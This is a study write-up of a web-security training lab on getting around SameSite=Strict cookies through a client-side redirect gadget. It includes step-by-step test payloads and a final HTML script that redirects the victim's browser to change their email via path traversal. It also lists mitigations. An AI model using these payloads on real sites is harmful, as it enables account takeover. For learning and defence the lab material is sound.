# Lab08 - SameSite Strict Bypass Via Client-Side Redirect

## Objective

Exploit a CSRF vulnerability despite SameSite=Strict protection by abusing a client-side redirect gadget.

---

# Lab Difficulty

```text
Practitioner
```

---

# Vulnerability Overview

The application uses:

```text
SameSite=Strict
```

for session cookies.

Normally this blocks all cross-site cookie sending.

However, a vulnerable client-side redirect gadget enables a same-site secondary request.

---

# Root Cause

The application contains:

```text
Client-Side Redirect
+
User Controlled Input
+
Sensitive GET Endpoint
```

---

# Analysis

Login response:

```http
Set-Cookie:
session=abc123;
SameSite=Strict
```

Cookies should never be sent cross-site.

---

# Initial Observation

Captured request:

```http
POST /my-account/change-email
```

Observations:

- No CSRF token
- No csrfKey
- Endpoint also accepts GET requests

---

# Gadget Discovery

Endpoint:

```http
/post/comment/confirmation?postId=2
```

contains client-side redirect logic.

---

# Testing Redirect

Payload:

```http
/post/comment/confirmation?postId=../my-account
```

Browser redirected successfully.

---

# Path Traversal Testing

Payload:

```http
/post/comment/confirmation?postId=../my-account/change-email
```

Successful.

---

# Exploitation Flow

```text
Victim Visits Evil Site
        ↓
Cross-Site Request
        ↓
Redirect Gadget Triggered
        ↓
Same-Site Secondary Request
        ↓
Strict Cookie Included
        ↓
Email Changed
```

---

# Final Payload

```html
<script>
document.location =
"https://TARGET/post/comment/confirmation?postId=../my-account/change-email?email=hacker@evil.com%26submit=1";
</script>
```

---

# Why %26 Is Required

Using:

```text
&
```

would create a second URL parameter.

Encoding it as:

```text
%26
```

keeps it inside:

```text
postId
```

until the redirect executes.

---

# Why The Attack Works

Hop 1:

```text
evil.com
        ↓
target.com
```

Cookies blocked.

---

Hop 2:

```text
target.com
        ↓
target.com/change-email
```

Cookies included.

Browser treats this as:

```text
Same-Site
```

---

# Why Server-Side Redirects Are Different

Browsers recognize:

```text
Cross-Site Redirect Chain
```

and continue enforcing restrictions.

Client-side redirects do not receive the same treatment.

---
# Personal Analysis & Testing Process

## Step 1 - Verify SameSite Protection

Capture:

```http
POST /login
```

Inspect response:

```http
Set-Cookie:
session=XYZ;
SameSite=Strict
```

Observation:

```text
Application uses SameSite=Strict
```

This means normal cross-site CSRF attacks should fail.

---

## Step 2 - Analyze Change Email Function

Capture:

```http
POST /my-account/change-email
```

Observations:

- No CSRF Token
- No csrfKey
- Cookie-based authentication

Potentially vulnerable if SameSite can be bypassed.

---

## Step 3 - Check Alternative Request Methods

Convert:

```http
POST → GET
```

using Burp Repeater.

Observation:

```text
302 Response
```

Request accepted.

This means:

```text
GET requests can perform email changes
```

which is dangerous.

---

## Step 4 - Search For Client-Side Redirect Gadgets

Endpoint discovered:

```http
/post/comment/confirmation?postId=2
```

Inspection revealed:

```javascript
window.location
```

based redirect behavior.

---

## Step 5 - Test Redirect Manipulation

### Payload 1

```text
/post/comment/confirmation?postId=2
```

Normal behavior.

---

### Payload 2

```text
/post/comment/confirmation?postId=my-account
```

Testing user-controlled redirect.

---

### Payload 3

```text
/post/comment/confirmation?postId=../my-account
```

Path traversal successful.

---

### Payload 4

```text
/post/comment/confirmation?postId=../my-account/change-email?email=wiener123%40normal-user.net&submit=1
```

Failed due to parameter separation.

---

### Payload 5

```text
/post/comment/confirmation?postId=../my-account/change-email?email=wiener123%40normal-user.net%26submit=1
```

Success.

Own email changed.

---

## Why %26 Works

Using:

```text
&
```

creates a new URL parameter.

Using:

```text
%26
```

keeps the value inside:

```text
postId
```

until the redirect executes.

This allows:

```text
email=...
&
submit=1
```

to survive the redirect.

---

## Step 6 - Create Final Exploit

```html
<script>
window.location =
"https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=hacker%40evil.com%26submit=1";
</script>
```

---

## Why SameSite=Strict Is Bypassed

### First Request

```text
evil.com
        ↓
target.com/confirmation
```

Cross-site.

Cookie blocked.

---

### Second Request

```text
target.com/confirmation
        ↓
target.com/change-email
```

Same-site.

Cookie included.

---

## Core Revision Note

```text
SameSite=Strict only protects the initial cross-site request.

A client-side redirect gadget can transform the attack into a trusted same-site secondary request.
```

This is one of the most important SameSite bypass techniques in PortSwigger.

# Mitigation

Applications should:

- Avoid client-side redirect gadgets
- Validate redirect destinations
- Use CSRF tokens
- Avoid state-changing GET requests

---

# Related Theory

- `13-bypassing-samesite-restrictions-using-on-site-gadgets.md`

---

# Key Learnings

- SameSite=Strict is not perfect.
- Client-side redirect gadgets are powerful bypass primitives.
- Same-site secondary requests inherit cookie trust.

> [!IMPORTANT]
> SameSite checks the initial request, but client-side redirects can create trusted secondary requests.